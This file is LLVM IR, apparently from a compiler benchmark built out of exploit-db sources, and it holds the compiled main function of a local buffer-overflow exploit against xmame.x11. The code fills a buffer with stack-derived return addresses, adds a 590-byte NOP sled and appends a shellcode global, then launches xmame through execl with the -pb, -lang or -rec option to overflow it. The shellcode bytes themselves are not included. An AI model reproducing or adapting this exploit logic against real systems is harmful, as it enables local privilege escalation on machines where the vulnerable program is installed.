; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_1425.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_1425.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [27 x i8] c"Using -pb overflow method\0A\00", align 1
@.str.1 = private unnamed_addr constant [4 x i8] c"-pb\00", align 1
@.str.2 = private unnamed_addr constant [29 x i8] c"Using -lang overflow method\0A\00", align 1
@.str.3 = private unnamed_addr constant [6 x i8] c"-lang\00", align 1
@.str.4 = private unnamed_addr constant [28 x i8] c"Using -rec overflow method\0A\00", align 1
@.str.5 = private unnamed_addr constant [5 x i8] c"-rec\00", align 1
@shellcode = common dso_local global i32* null, align 8
@.str.6 = private unnamed_addr constant [21 x i8] c"/usr/games/xmame.x11\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i64, align 8
  %11 = alloca i64, align 8
  %12 = alloca i64*, align 8
  %13 = alloca i8*, align 8
  %14 = alloca i8*, align 8
  %15 = alloca i8*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %7, align 4
  %16 = call i64 (...) @sp()
  store i64 %16, i64* %10, align 8
  %17 = load i64, i64* %10, align 8
  %18 = load i32, i32* %7, align 4
  %19 = sext i32 %18 to i64
  %20 = sub nsw i64 %17, %19
  store i64 %20, i64* %11, align 8
  %21 = load i32, i32* %4, align 4
  %22 = icmp ne i32 %21, 2
  br i1 %22, label %23, label %25

23:                                               ; preds = %2
  %24 = call i32 (...) @usage()
  store i32 1, i32* %3, align 4
  br label %99

25:                                               ; preds = %2
  %26 = load i8**, i8*** %5, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 1
  %28 = load i8*, i8** %27, align 8
  %29 = call i32 @atoi(i8* %28)
  store i32 %29, i32* %8, align 4
  %30 = load i32, i32* %8, align 4
  switch i32 %30, label %37 [
    i32 1, label %31
    i32 2, label %33
    i32 3, label %35
  ]

31:                                               ; preds = %25
  %32 = call i32 @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str, i64 0, i64 0))
  store i32 1037, i32* %9, align 4
  store i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.1, i64 0, i64 0), i8** %15, align 8
  br label %39

33:                                               ; preds = %25
  %34 = call i32 @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.2, i64 0, i64 0))
  store i32 1057, i32* %9, align 4
  store i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.3, i64 0, i64 0), i8** %15, align 8
  br label %39

35:                                               ; preds = %25
  %36 = call i32 @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.4, i64 0, i64 0))
  store i32 1057, i32* %9, align 4
  store i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.5, i64 0, i64 0), i8** %15, align 8
  br label %39

37:                                               ; preds = %25
  %38 = call i32 (...) @usage()
  store i32 1, i32* %3, align 4
  br label %99

39:                                               ; preds = %35, %33, %31
  %40 = load i32, i32* %9, align 4
  %41 = call i8* @malloc(i32 %40)
  store i8* %41, i8** %13, align 8
  %42 = load i8*, i8** %13, align 8
  store i8* %42, i8** %14, align 8
  %43 = load i8*, i8** %14, align 8
  %44 = bitcast i8* %43 to i64*
  store i64* %44, i64** %12, align 8
  store i32 0, i32* %6, align 4
  br label %45

45:                                               ; preds = %53, %39
  %46 = load i32, i32* %6, align 4
  %47 = load i32, i32* %9, align 4
  %48 = icmp slt i32 %46, %47
  br i1 %48, label %49, label %56

49:                                               ; preds = %45
  %50 = load i64, i64* %11, align 8
  %51 = load i64*, i64** %12, align 8
  %52 = getelementptr inbounds i64, i64* %51, i32 1
  store i64* %52, i64** %12, align 8
  store i64 %50, i64* %51, align 8
  br label %53

53:                                               ; preds = %49
  %54 = load i32, i32* %6, align 4
  %55 = add nsw i32 %54, 4
  store i32 %55, i32* %6, align 4
  br label %45

56:                                               ; preds = %45
  store i32 0, i32* %6, align 4
  br label %57

57:                                               ; preds = %65, %56
  %58 = load i32, i32* %6, align 4
  %59 = icmp slt i32 %58, 590
  br i1 %59, label %60, label %68

60:                                               ; preds = %57
  %61 = load i8*, i8** %13, align 8
  %62 = load i32, i32* %6, align 4
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds i8, i8* %61, i64 %63
  store i8 -112, i8* %64, align 1
  br label %65

65:                                               ; preds = %60
  %66 = load i32, i32* %6, align 4
  %67 = add nsw i32 %66, 1
  store i32 %67, i32* %6, align 4
  br label %57

68:                                               ; preds = %57
  %69 = load i8*, i8** %13, align 8
  %70 = getelementptr inbounds i8, i8* %69, i64 590
  store i8* %70, i8** %14, align 8
  store i32 0, i32* %6, align 4
  br label %71

71:                                               ; preds = %85, %68
  %72 = load i32, i32* %6, align 4
  %73 = load i32*, i32** @shellcode, align 8
  %74 = call i32 @strlen(i32* %73)
  %75 = icmp slt i32 %72, %74
  br i1 %75, label %76, label %88

76:                                               ; preds = %71
  %77 = load i32*, i32** @shellcode, align 8
  %78 = load i32, i32* %6, align 4
  %79 = sext i32 %78 to i64
  %80 = getelementptr inbounds i32, i32* %77, i64 %79
  %81 = load i32, i32* %80, align 4
  %82 = trunc i32 %81 to i8
  %83 = load i8*, i8** %14, align 8
  %84 = getelementptr inbounds i8, i8* %83, i32 1
  store i8* %84, i8** %14, align 8
  store i8 %82, i8* %83, align 1
  br label %85

85:                                               ; preds = %76
  %86 = load i32, i32* %6, align 4
  %87 = add nsw i32 %86, 1
  store i32 %87, i32* %6, align 4
  br label %71

88:                                               ; preds = %71
  %89 = load i8*, i8** %13, align 8
  %90 = load i32, i32* %9, align 4
  %91 = sub nsw i32 %90, 1
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds i8, i8* %89, i64 %92
  store i8 0, i8* %93, align 1
  %94 = load i8*, i8** %15, align 8
  %95 = load i8*, i8** %13, align 8
  %96 = call i32 @execl(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.6, i64 0, i64 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.6, i64 0, i64 0), i8* %94, i8* %95, i32 0)
  %97 = load i8*, i8** %13, align 8
  %98 = call i32 @free(i8* %97)
  store i32 0, i32* %3, align 4
  br label %99

99:                                               ; preds = %88, %37, %23
  %100 = load i32, i32* %3, align 4
  ret i32 %100
}

declare dso_local i64 @sp(...) #1

declare dso_local i32 @usage(...) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @printf(i8*) #1

declare dso_local i8* @malloc(i32) #1

declare dso_local i32 @strlen(i32*) #1

declare dso_local i32 @execl(i8*, i8*, i8*, i8*, i32) #1

declare dso_local i32 @free(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
